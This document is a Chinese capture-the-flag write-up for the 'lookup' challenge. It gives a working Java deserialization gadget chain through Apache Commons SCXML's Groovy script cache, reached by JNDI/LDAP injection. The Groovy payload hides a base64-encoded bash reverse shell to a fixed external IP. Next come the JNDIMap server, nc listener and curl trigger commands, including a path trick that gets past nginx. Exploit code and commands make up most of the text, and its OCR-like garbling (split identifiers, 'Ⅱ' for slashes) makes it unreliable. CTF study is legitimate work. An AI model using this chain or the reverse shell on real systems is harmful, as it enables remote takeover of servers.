---
tags: [JNDI注入, Java反序列化, Groovy, ASTTest, RCE]
---

# lookup

JNDI 注入, 使用 ldap 协议触发反序列化

org.apache .commons .scxml2 .env .groovy.GroovyExtendableScriptCache  的   readO bject 方法会调用  ensureInitializedOrReloaded , 然后会从 scriptCache 中获取并编译Groovy 脚本, 可以通过 meta programming 进行 RCE

payload

```
package  com .example;

import  org.apache .commons .scxml2 .env .groovy.GroovyExtendableScriptCache ;

import  java .lang.reflect .Constructor;
import  java .nio .file .Files ;
import  java .nio .file .Paths ;
import  java .util . LinkedHashMap ;

public  class  Gadget  {
public  static  void  main(String[]  args)  throws  Exception  {
String  content  =  "@groovy.transform .ASTTest(value={ "  +
"assert  Runtime .getRuntime() .exec (\"bash  -c
{echo ,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjIuNTEuMjEuOS82NTEyMyAwPiYx}|{base64 , -d}| {bash , -i}\") "  +
"})\n "  +
"def  x " ;

GroovyExtendableScriptCache  cache  =  new  GroovyExtendableScriptCache();

Constructor  constructor  =
Class .forName("org.apache .commons .scxml2 .env .groovy.GroovyExtendableScriptCach e$ScriptCacheElement") .getDeclaredConstructor(String .class ,  String.class) ;
constructor .setAccessible(true) ;
Object  element  =  constructor .newInstance(null ,  content) ;
ReflectUtil .setFieldValue(element ,  "scriptName " ,  "c ") ;

LinkedHashMap  scriptCache  =  ( LinkedHashMap) ReflectUtil .getFieldValue(cache ,  "scriptCache") ;
scriptCache .put(element ,  null) ;
ReflectUtil .setFieldValue(cache ,  "scriptCache " ,  scriptCache) ;

Ⅱ                 SerializeUtil .test(cache) ;
Files .write(Paths .get("cache .ser") ,  SerializeUtil .serialize(cache)) ; 
```

ReflectUtil

```
package  com .example;

import  java .lang.reflect .Constructor;
import  java .lang .reflect .Field ;
import  java .lang .reflect .Method ;

public  class  ReflectUtil  {

public  static  Object  getFieldValue(Object  obj ,  String  name)  throws Exception  {
return  getFieldValue(obj .getClass() ,  obj ,  name) ;
}

public  static  Object  getFieldValue(Class<?>  clazz ,  Object  obj ,  String name)  throws  Exception  {
Field  f  =  clazz .getDeclaredField(name) ;
f .setAccessible(true) ;
return  f .get(obj) ;
}

public  static  void  setFieldValue(Object  obj ,  String  name ,  Object  val) throws  Exception  {
setFieldValue(obj .getClass() ,  obj ,  name ,  val) ;
}

public  static  void  setFieldValue(Class<?>  clazz ,  Object  obj ,  String  name , Object  val)  throws  Exception  {
Field  f  =  clazz .getDeclaredField(name) ;
f .setAccessible(true) ;
f .set(obj ,  val) ;
}

public  static  Object  invokeMethod(Object  obj ,  String  name ,  Class [] parameterTypes ,  Object []  args)  throws  Exception  {
return  invokeMethod(obj .getClass() ,  obj ,  name ,  parameterTypes ,  args) ; }

public  static  Object  invokeMethod(Class<?>  clazz ,  Object  obj ,  String  name , Class []  parameterTypes ,  Object []  args)  throws  Exception  {
Method  m  =  obj .getClass() .getDeclaredMethod(name ,  parameterTypes) ;
m .setAccessible(true) ;
return  m .invoke(obj ,  args) ;
}

public  static  Object  newInstance(Class<?>  clazz ,  Class[]  parameterTypes , Object []  args)  throws  Exception  {
Constructor  constructor  =
clazz .getDeclaredConstructor(parameterTypes) ;
constructor .setAccessible(true) ;
return  constructor .newInstance(args) ;
}
}
```

SerializeUtil

```
package  com .example;

import  java .io .ByteArrayInputStream;
import  java .io .ByteArrayOutputStream;
import  java .io .ObjectInputStream;
import  java .io .ObjectOutputStream;

public  class  SerializeUtil  {

public  static  byte[]  serialize(Object  obj)  throws  Exception  { ByteArrayOutputStream  arr  =  new  ByteArrayOutputStream();
try  (ObjectOutputStream  output  =  new  ObjectOutputStream(arr)){ output .writeObject(obj) ;
}
return  arr .toByteArray() ;
}

public  static  Object  deserialize(byte[]  arr)  throws  Exception  {
try  (ObjectInputStream  input  =  new  ObjectInputStream(new
ByteArrayInputStream(arr))){
return  input .readObject() ;
}
}

public  static  void  test(Object  obj)  throws  Exception  {
deserialize(serialize(obj)) ;
}
}
```

执行上述代码得到cache.ser

然后下载 JNDI 注入工具:https://github.com/X1r0z/JNDIMap

按照 README 手动编译后, 将 jar 包和 cache.ser 放在同一目录下



然后在 vps 上分别开三个 ssh 窗口 , 依次执行如下命令

```
#  1
java  -jar  JNDIMap-0 .0 .1 .jar  -u  "/Deserialize/FromFile/cache .ser "  -i 122 .51 .21 .9

#  2
nc  -lvnp  65123

#  3 ,  use  Ⅱaaa/lookup  to  bypass  nginx  conf
curl  "https:Ⅱlookup-o66tbkficki6.chals.sekai.team Ⅱaaa/lookup? ldap:Ⅱ122 .51 .21 .9:1389/x "
```

反弹 shell 后执行 /flag 得到 flag